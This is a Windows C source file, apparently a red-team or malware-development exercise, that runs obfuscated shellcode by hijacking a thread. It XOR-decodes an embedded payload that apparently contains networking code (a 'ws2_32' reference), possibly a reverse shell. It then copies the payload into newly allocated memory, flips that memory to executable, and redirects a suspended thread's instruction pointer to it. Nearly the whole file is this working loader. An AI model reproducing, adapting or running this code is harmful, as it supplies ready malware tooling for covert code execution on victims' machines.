#include <windows.h>
#include <stdio.h>
#pragma comment(lib,"user32.lib")

void DummyFunction(void) {
	printf("LITERALLY THIRD WHEELING");
	return;
}



int main(void){

	
	DWORD OldProtection = 0;
	CONTEXT CTX = { .ContextFlags = CONTEXT_ALL };
	unsigned char shellcode[] = {
		"\xbb\x0f\xc4\xa3\xb7\xaf\x8b\x47\x47\x47\x06\x16\x06\x17\x15\x16\x11\x0f\x76\x95\x22\x0f\xcc\x15\x27\x0f\xcc\x15\x5f\x0f\xcc\x15\x67\x0f\xcc\x35\x17\x0a\x76\x8e\x0f\x48\xf0\x0d\x0d\x0f\x76\x87\xeb\x7b\x26\x3b\x45\x6b\x67\x06\x86\x8e\x4a\x06\x46\x86\xa5\xaa\x15\x0f\xcc\x15\x67\xcc\x05\x7b\x0f\x46\x97\x06\x16\x21\xc6\x3f\x5f\x4c\x45\x48\xc2\x35\x47\x47\x47\xcc\xc7\xcf\x47\x47\x47\x0f\xc2\x87\x33\x20\x0f\x46\x97\xcc\x0f\x5f\x03\xcc\x07\x67\x0e\x46\x97\x17\xa4\x11\x0f\xb8\x8e\x06\xcc\x73\xcf\x0a\x76\x8e\x0f\x46\x91\x0f\x76\x87\xeb\x06\x86\x8e\x4a\x06\x46\x86\x7f\xa7\x32\xb6\x0b\x44\x0b\x63\x4f\x02\x7e\x96\x32\x9f\x1f\x03\xcc\x07\x63\x0e\x46\x97\x21\x06\xcc\x4b\x0f\x03\xcc\x07\x5b\x0e\x46\x97\x06\xcc\x43\xcf\x0f\x46\x97\x06\x1f\x06\x1f\x19\x1e\x1d\x06\x1f\x06\x1e\x06\x1d\x0f\xc4\xab\x67\x06\x15\xb8\xa7\x1f\x06\x1e\x1d\x0f\xcc\x55\xae\x0c\xb8\xb8\xb8\x1a\x0e\xf9\x30\x34\x75\x18\x74\x75\x47\x47\x06\x11\x0e\xce\xa1\x0f\xc6\xab\xe7\x46\x47\x47\x0e\xce\xa2\x0e\xfb\x45\x47\x47\x3c\x87\xef\x46\x53\x06\x13\x0e\xce\xa3\x0b\xce\xb6\x06\xfd\x0b\x30\x61\x40\xb8\x92\x0b\xce\xad\x2f\x46\x46\x47\x47\x1e\x06\xfd\x6e\xc7\x2c\x47\xb8\x92\x2d\x4d\x06\x19\x17\x17\x0a\x76\x8e\x0a\x76\x87\x0f\xb8\x87\x0f\xce\x85\x0f\xb8\x87\x0f\xce\x86\x06\xfd\xad\x48\x98\xa7\xb8\x92\x0f\xce\x80\x2d\x57\x06\x1f\x0b\xce\xa5\x0f\xce\xbe\x06\xfd\xde\xe2\x33\x26\xb8\x92\xc2\x87\x33\x4d\x0e\xb8\x89\x32\xa2\xaf\xd4\x47\x47\x47\x0f\xc4\xab\x57\x0f\xce\xa5\x0a\x76\x8e\x2d\x43\x06\x1f\x0f\xce\xbe\x06\xfd\x45\x9e\x8f\x18\xb8\x92\xc4\xbf\x47\x39\x12\x0f\xc4\x83\x67\x19\xce\xb1\x2d\x07\x06\x1e\x2f\x47\x57\x47\x47\x06\x1f\x0f\xce\xb5\x0f\x76\x8e\x06\xfd\x1f\xe3\x14\xa2\xb8\x92\x0f\xce\x84\x0e\xce\x80\x0a\x76\x8e\x0e\xce\xb7\x0f\xce\x9d\x0f\xce\xbe\x06\xfd\x45\x9e\x8f\x18\xb8\x92\xc4\xbf\x47\x3a\x6f\x1f\x06\x10\x1e\x2f\x47\x07\x47\x47\x06\x1f\x2d\x47\x1d\x06\xfd\x4c\x68\x48\x77\xb8\x92\x10\x1e\x06\xfd\x32\x29\x0a\x26\xb8\x92\x0e\xb8\x89\xae\x7b\xb8\xb8\xb8\x0f\x46\x84\x0f\x6e\x81\x0f\xc2\xb1\x32\xf3\x06\xb8\xa0\x1f\x2d\x47\x1e\x0e\x80\x85\xb7\xf2\xe5\x11\xb8\x92\x47"
	};
	
	char key= 'BING';
	for (int i=0; i<sizeof(shellcode)-1; i++){
		printf("\\x%02x",shellcode[i]^key);
		shellcode[i]=shellcode[i]^key;
		
	}
	
	DWORD shellcode_size=sizeof(shellcode);	
	HANDLE hThread;
	PVOID Buffer;
	printf("[+] creating a suspended thread...\n");
	hThread=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);
	if (hThread == NULL){
		printf("[CreateThread] FAILED TO Create Thread, error %lu",GetLastError());
		return EXIT_FAILURE;
	}
	printf("[0x%p] created the thread (%ld)! beginning the hijack...\n", hThread, GetThreadId(hThread));
	Buffer = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (NULL == Buffer) {
		printf("[VirtualAlloc] FAILED , err %lu",GetLastError());
		return EXIT_FAILURE;
	}
	printf("[0x%p] [RW-] allocated a buffer in memory with PAGE_READWRITE [RW-] permissions!", Buffer);
	

	
	RtlCopyMemory(Buffer, shellcode, shellcode_size); /* just a wrapper for memcpy() */
	printf("[0x%p] [RW-] copied payload contents (%zu-bytes) to the allocated buffer\n", Buffer, shellcode_size);

	if (!VirtualProtect(Buffer, shellcode_size, PAGE_EXECUTE_READ, &OldProtection)) {
		printf("VirtualProtect\n");
		return EXIT_FAILURE;
	}
	printf("[0x%p] [R-X] changed memory protection of allocated buffer to PAGE_EXECUTE_READ [R-X]\n", Buffer);

	if (!GetThreadContext(hThread, &CTX)) {
		printf("GetThreadContext,error %lu\n",GetLastError());
		return EXIT_FAILURE;
	}
	printf("[0x%p] got the thread's context! here are the register values:\n", &CTX);

	printf(
		"[v] |              \n"
		"[v] | RIP -> [0x%p]\n"
		"[v] | RAX -> [0x%p]\n"
		"[v] | RBX -> [0x%p]\n"
		"[v] | RCX -> [0x%p]\n"
		"[v] | RDX -> [0x%p]\n"
		"[v] | RSP -> [0x%p]\n"
		"[v] | RBP -> [0x%p]\n",
		(PVOID*)CTX.Rip, (PVOID*)CTX.Rax, (PVOID*)CTX.Rbx,
		(PVOID*)CTX.Rcx, (PVOID*)CTX.Rdx, (PVOID*)CTX.Rsp, (PVOID*)CTX.Rbp
	);

	printf("| RIP -> [0x%p] updating the thread's context to make RIP point to our allocated buffer...\n", (PVOID*)CTX.Rip);

	CTX.Rip = (DWORD64)Buffer;

	if (!SetThreadContext(hThread, &CTX)) {
		printf("SetThreadContext\n, error %lu\n",GetLastError());
		return EXIT_FAILURE;
	}
	printf("| RIP -> [0x%p] set the thread's context! RIP now points to our payload buffer!\n", (PVOID*)CTX.Rip);

	printf(
		"[v] | RIP -> [0x%p]\n"
		"[v] | RAX -> [0x%p]\n"
		"[v] | RBX -> [0x%p]\n"
		"[v] | RCX -> [0x%p]\n"
		"[v] | RDX -> [0x%p]\n"
		"[v] | RSP -> [0x%p]\n"
		"[v] | RBP -> [0x%p]\n"
		"[v] |              \n",
		(PVOID*)CTX.Rip, (PVOID*)CTX.Rax, (PVOID*)CTX.Rbx,
		(PVOID*)CTX.Rcx, (PVOID*)CTX.Rdx, (PVOID*)CTX.Rsp, (PVOID*)CTX.Rbp
	);
	
	
	
	
	printf("[0x%p] hijack was successful! resuming thread...\n", hThread);
	ResumeThread(hThread);
	printf("[0x%p] waiting for thread to finish execution...", hThread);
	WaitForSingleObject(hThread, INFINITE);
	printf("[0x%p] thread finished execution! beginning cleanup...", hThread);

	if (Buffer) {
		VirtualFree(Buffer, 0, MEM_RELEASE);
		printf("[0x%p] allocated buffer freed\n", Buffer);
	}

	if (hThread) {
		CloseHandle(hThread);
		printf("[0x%p] closed thread handle\n", hThread);
	}
	return EXIT_SUCCESS;
}